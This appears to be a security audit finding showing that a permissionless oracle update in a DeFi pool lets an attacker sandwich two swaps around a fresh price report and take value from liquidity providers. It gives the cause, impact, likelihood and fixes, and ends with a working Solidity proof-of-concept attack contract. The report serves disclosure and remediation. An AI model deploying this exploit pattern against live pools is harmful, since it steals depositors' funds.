Audit Report

## Title
Permissionless `updateReport` Enables Same-Transaction Oracle Sandwich Against LP Funds — (`File: smart-contracts-poc/contracts/oracles/providers/ChainlinkOracle.sol`)

## Summary
`ChainlinkOracle.updateReport()` has no caller restriction beyond DON-signature verification, allowing any party holding a valid off-chain report to push a new price into oracle storage at any time. Because `MetricOmmPool.swap()` reads the oracle fresh on every call and the transient reentrancy guard only blocks nested re-entry (not sequential calls in the same transaction), an attacker can execute two sequential swaps around a self-submitted oracle update in a single atomic transaction, extracting value from LP bin balances.

## Finding Description

**Permissionless write path confirmed**

`ChainlinkOracle.updateReport()` has no access-control modifier:

```solidity
function updateReport(bytes calldata fullReport) external {
    _store(_verifyReport(fullReport));
}
```

The only gate is DON-signature verification via `verifierProxy.verify`. `_store()` then applies only a zero-timestamp check, a max-drift check, and a monotonicity check (`isAfter`). No check prevents calling this function between two sequential pool swaps in the same transaction.

**Pool reads oracle fresh on every swap**

`MetricOmmPool.swap()` calls `_getBidAndAskPriceX64()` at the start of every swap, which performs a live storage read of the current oracle data through the price provider. There is no per-block price lock, no caching, and no TWAP.

**Sequential swaps in one transaction are not blocked**

`MetricReentrancyGuardTransient._nonReentrantBefore()` stores the action ID in transient storage and reverts if it is already non-zero. After `_nonReentrantAfter()` clears it, a second call to `swap()` in the same transaction succeeds unconditionally. Only nested (re-entrant) calls are blocked.

**`inSwap()` protection covers only the READ path, not the WRITE path**

`OracleBase.price()` requires `IPool(pool).inSwap() == msg.sender`, binding oracle reads to an active swap context. This protection is irrelevant to `updateReport()`, which is a write operation with no such binding. The attacker calls `updateReport()` between two complete, non-overlapping swaps — the in-swap marker is `0` at that point, but `updateReport()` does not check it.

**Attack flow (single atomic transaction)**

```
AttackerContract.attack():
  1. pool.swap(zeroForOne=false, ...)   // buy token0 at ask derived from P_old (inSwap marker set/cleared)
  2. oracle.updateReport(report_P_new)  // push newer DON-signed report; oracle now stores P_new > P_old
  3. pool.swap(zeroForOne=true, ...)    // sell token0 at bid derived from P_new (inSwap marker set/cleared)
```

Step 2 requires no swap context. The update succeeds as long as the report's timestamp is strictly newer than the stored one — a condition trivially satisfied during any price movement.

## Impact Explanation

LPs bear the direct loss. In step 1 the pool sells token0 to the attacker at the ask price anchored to the stale (lower) oracle value P_old; in step 3 the pool buys token0 back from the attacker at the bid price anchored to the updated (higher) oracle value P_new. The difference — net of the bid/ask spread — is extracted from `binTotals.scaledToken0` / `binTotals.scaledToken1`. This is a direct, quantifiable loss of LP principal with no recovery path. Severity: Medium.

## Likelihood Explanation

Chainlink Data Streams reports are publicly observable off-chain; no privileged access is required. The attacker needs only two valid DON-signed reports with strictly increasing timestamps — a condition satisfied during any price movement. No special pool role, admin key, or malicious setup is required. The attack is atomic and reverts cleanly if unprofitable, so there is no capital risk to the attacker beyond gas. Likelihood: Medium.

## Recommendation

1. **Per-block price lock**: Record `block.number` the first time the oracle price is read during a swap and reject any `updateReport` call (or re-read) for the same feed within the same block.
2. **Require report age**: Require that a newly submitted report is at least one block old before it can be consumed by a swap (`block.number > reportBlock`).
3. **TWAP**: Derive `midPriceX64` from a short TWAP rather than a spot read, making single-block manipulation unprofitable.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

interface IPool {
    function swap(address recipient, bool zeroForOne, int128 amountSpecified,
                  uint128 priceLimitX64, bytes calldata callbackData,
                  bytes calldata extensionData) external returns (int128, int128);
}
interface IOracle { function updateReport(bytes calldata fullReport) external; }
interface IERC20   { function approve(address, uint256) external; function balanceOf(address) external view returns (uint256); function transfer(address, uint256) external; }

contract OracleSandwich {
    IPool   immutable pool;
    IOracle immutable oracle;
    address immutable token0;
    address immutable token1;

    constructor(address _pool, address _oracle, address _t0, address _t1) {
        pool = IPool(_pool); oracle = IOracle(_oracle); token0 = _t0; token1 = _t1;
    }

    function attack(bytes calldata reportNew, int128 amount) external {
        IERC20(token1).approve(address(pool), uint256(int256(amount)));
        // 1. Buy token0 at ask derived from current (lower) oracle price P_old
        pool.swap(address(this), false, amount, 0, "", "");
        // 2. Push the newer, higher-price report — no swap context required
        oracle.updateReport(reportNew);
        // 3. Sell token0 at bid derived from new (higher) oracle price P_new
        int128 token0Bal = int128(int256(IERC20(token0).balanceOf(address(this))));
        IERC20(token0).approve(address(pool), uint256(int256(token0Bal)));
        pool.swap(msg.sender, true, token0Bal, 0, "", "");
    }

    function metricOmmSwapCallback(int256 d0, int256 d1, bytes calldata) external {
        if (d0 > 0) IERC20(token0).transfer(msg.sender, uint256(d0));
        if (d1 > 0) IERC20(token1).transfer(msg.sender, uint256(d1));
    }
}
```

Expected result: `token1` balance of `msg.sender` after the call exceeds the `amount` input, with the difference coming from LP bin balances. The attack is atomic and reverts if unprofitable.
